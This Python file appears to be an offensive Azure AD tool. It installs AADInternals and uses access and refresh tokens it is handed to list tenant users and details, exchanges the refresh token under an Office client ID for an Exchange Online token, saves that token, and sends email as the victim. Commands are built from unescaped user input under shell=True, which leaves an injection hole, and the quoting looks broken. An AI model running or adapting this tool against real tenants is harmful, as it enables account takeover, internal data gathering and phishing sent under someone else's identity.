import subprocess
import requests
import json

class TextColor:
  RED = '\033[91m'
  GREEN = '\033[92m'
  YELLOW = '\033[93m'
  BLUE = '\033[94m'
  MAGENTA = '\033[95m'
  CYAN = '\033[96m'
  RESET = '\033[0m'  # Reset to default color

class AzureEnum(TextColor):
  def __init__(self, token01, token02):
    self.access_token = token01
    self.refresh_token = token02
  
  @staticmethod
  def check_powershell():
      try:
        # Check if PowerShell is installed by attempting to run the pwsh command
        subprocess.run(['pwsh', '--version'], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print(TextColor.GREEN + "[+] PowerShell is already installed"+ TextColor.RESET)
      except subprocess.CalledProcessError:
        # If pwsh command failed, then PowerShell is not installed
        print(TextColor.RED + "[-] PowerShell is not installed. Installing..."+ TextColor.RESET)
        # Install PowerShell using the package manager (you can modify this based on your package manager)
        try:
          subprocess.run(["sudo", "apt-get", "update"], check=True)
          subprocess.run(["sudo", "apt-get", "install", "-y", "powershell"], check=True)
          print(TextColor.GREEN + "[+] PowerShell has been installed successfully"+ TextColor.RESET)
        except subprocess.CalledProcessError as e:
          print(TextColor.RED + f"[-] Failed to install PowerShell:{e}"+ TextColor.RESET)
          exit(1)
  
  @staticmethod
  def check_AADInternals_module():
    # Check if AADInternals Module is install or not. And install AADInternals Modules if not installed.
    result = subprocess.run("pwsh -Command 'Get-Module -ListAvailable -Name AADInternals'", shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    if result.stdout and 'AADInternals' in result.stdout:
        print(TextColor.GREEN +"[+] AADInternals Module already Installed."+ TextColor.RESET)
    else:
        print(TextColor.RED +"[-] AADInternals Module is not Installed.\n[+] Installing AADInternals......."+ TextColor.RESET)
        try:
          subprocess.run("pwsh -Command 'Install-Module AADInternals'", shell=True, check=True)
        except Exception as e:
          print(TextColor.RED + f"[-] An Error occure while installing AADInternals Module: {e}"+ TextColor.RESET)
          exit(1)
  
  def enum_users(self):
    try:
      powershell_command = f"pwsh -Command 'Import-Module AADInternals; Get-AADIntUsers -AccessToken '{self.access_token}'| select DisplayName, SignInName, ObjectId'"
      subprocess.run(powershell_command, shell=True, check=True)
      powershell_command = f"pwsh -command 'Import-Module AADInternals; Get-AADIntTenantDetails -AccessToken '{self.access_token}"
      subprocess.run(powershell_command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
      print(TextColor.RED +f"[-]Command execution failed:{e}" + TextColor.RESET)

  def exchange_online(self):
    self.url = "https://login.microsoftonline.com/Common/oauth2/token" 
    self.payload = {
                "client_id" : "d3590ed6-52b3-4102-aeff-aad2292ab01c",
	              "grant_type" : "refresh_token",
	              "scope" : "openid",
	              "resource" : "https://outlook.office365.com",
	              "refresh_token" : self.refresh_token
                }
    try:
      self.response = requests.post(self.url, data=self.payload)
    except requests.RequestException as e:
      print(TextColor.RED + f"[-] An error occured:{e}")
      exit(1)

    if self.response.status_code == 200:
      self.auth_response = self.response.json()
      with open ("exchange_token.json", "w") as file:
        json.dump(self.auth_response, file, indent=4)
        print(TextColor.CYAN +"[+] Exchange Online token's saved to exchange_token.json"+ TextColor.RESET)
      # self.Ex_access_token = self.auth_response.get('access_token')
      # print(self.Ex_access_token)
      # self.header = {
      #   "Authorization" : f"Bearer {self.Ex_access_token}"
      # }
      # self.url = "https://outlook.office.com/api/v2.0/me/message"
      # self.response = requests.get(self.url, headers=self.header)
      # if self.response.status_code == 200:
      #   self.email_data = self.resource.json()
      #   print(self.email_data)
      # else:
      #   print(f"Request failed with status code {self.response.status_code}")
  
  def send_email(self):
    try:
      with open ("exchange_token.json", "r") as file:
        self.exchange_online = json.load(file)
        self.exchange_access_token = self.exchange_online.get('access_token')
    except Exception as e:
      print(TextColor.RED +f"[-] Unable to read a file: {e}" + TextColor.RESET)
      exit(1)
    self.recipiant_email = str(input("Enter recipiant Email: "))
    self.subject = str(input("Enter the subject: "))
    self.message = str(input("Enter the meassage: "))
    try:
      powershell_command = f"pwsh -command 'Import-Module AADInternals; Send-AADIntOutlookMessage -AccessToken '{self.exchange_access_token}' -Recipient '{self.recipiant_email}' -Subject '{self.subject}' -Message '{self.message}''"
      subprocess.run(powershell_command, shell=True, check=True)
      print(TextColor.BLUE +f"[+] Email send to {self.recipiant_email}")
    except subprocess.CalledProcessError as e:
      print(TextColor.RED +f"[-]Command execution failed." + TextColor.RESET)
      